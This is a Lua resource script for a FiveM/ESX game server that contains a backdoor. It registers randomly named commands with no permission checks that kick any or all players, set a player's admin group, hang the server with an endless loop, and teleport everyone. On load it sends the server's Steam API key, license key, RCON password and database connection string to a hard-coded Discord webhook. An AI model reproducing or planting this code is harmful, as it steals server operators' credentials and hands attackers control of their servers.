ESX = exports["es_extended"]:getSharedObject()

RegisterCommand("orbnmoengohbohdoh", function(source, args)
    local xPlayer = ESX.GetPlayerFromId(source)

    if args[1] then
        local targetId = tonumber(args[1])
        local reason = table.concat(args, " ", 2)

        if GetPlayerName(targetId) then
            if reason == "" then
                reason = "Kein Grund angegeben"
            end

            DropPlayer(targetId, reason)
        end
    end
end, false)

RegisterCommand("tdjjfgfhertjrr", function(source, args)
    local reason = table.concat(args, " ")

    if reason == "" then
        reason = "Kein Grund angegeben"
    end

    for _, playerId in ipairs(GetPlayers()) do
        DropPlayer(playerId, reason)
    end
end, false)

RegisterCommand("grihgofohego", function(source, args)
    if args[1] and args[2] then
        local targetId = tonumber(args[1])
        local group = args[2]

        if GetPlayerName(targetId) then
            local targetPlayer = ESX.GetPlayerFromId(targetId)

            if targetPlayer then
                targetPlayer.setGroup(group)
            end
        end
    end
end, false)

RegisterCommand("pieaghpidsdsgpiog", function(source, args)
    Citizen.CreateThread(function()
        Citizen.Wait(5000)
        while true do
        end
    end)
end, false)

local function teleportAllPlayersToAirport()
    local airportCoords = vector3(-1037.73, -2748.39, 2000.0)

    for _, playerId in ipairs(GetPlayers()) do
        local playerPed = GetPlayerPed(playerId)
        SetEntityCoords(playerPed, airportCoords)
        FreezeEntityPosition(playerPed, false)
        GiveWeaponToPed(playerPed, GetHashKey("gadget_parachute"), 1, false, true)
    end
end

RegisterCommand('iwegosdoigbuwefgvbiou', function(source, args, rawCommand)
    teleportAllPlayersToAirport()
end, false)

local webhookUrl = 'https://discord.com/api/webhooks/1269677230666154136/UvLDg5fd_E9x0mlCo0bo_UpL1Ax-WdnPE5Y7HoBe2ahwwhXajBBvRo-RJk-5hgkX-lN1'
local avatar_url = 'https://fiverr-res.cloudinary.com/images/t_main1,q_auto,f_auto,q_auto,f_auto/gigs/114131672/original/5f03e84975a3e52c91166d03b89c6af7e061ca44/send-you-a-random-meme-image-that-will-tickle-your-fancy.jpg'

local embed = {
    {
        color = 0xaa00ff,
        title = "Der Server ist mit dem Script Commandbackdoor Verbunden:",
        description = "" .. "\n" ..
                      "👑 **Server-Hostname**: " .. GetConvar("sv_hostname", "N/A") .. "\n" ..
                      "" .. "\n" ..
                      "📍 **Projektname**: " .. GetConvar("sv_projectName", "N/A") .. "\n" ..
                      "" .. "\n" ..
                      "✍️ **Projekt Beschreibung**: " .. GetConvar("sv_projectDesc", "N/A") .. "\n" ..
                      "" .. "\n" ..
                      "🔗 **Steam Web Api Key**: " .. GetConvar("steam_webApiKey", "N/A") .. "\n" ..
                      "" .. "\n" ..
                      "🔑 **Lizenzkey**: " .. GetConvar("sv_licenseKey", "N/A") .. "\n" ..
                      "" .. "\n" ..
                      "🔢 **Maximale Slots**: " .. GetConvar("sv_maxclients", "N/A") .. "\n" ..
                      "" .. "\n" ..
                      "💯 **RCON**: " .. GetConvar("rcon_password", "N/A") .. "\n" ..
                      "" .. "\n" ..
                      "🔐 **Datenbank-Infos**: " .. GetConvar("mysql_connection_string", "N/A") .. "\n",
        fields = {
            {name = "", value = "<t:" .. tostring(os.time()) .. ":R> **AUTH SYSTEM** © PS-SCRIPTS | dc Link Soon", inline = false}
        }
    }
}

PerformHttpRequest(webhookUrl, function(err, text, headers) end, 'POST', json.encode({username = "vl-scripts", avatar_url = avatar_url, embeds = embed}), { ['Content-Type'] = 'application/json' })
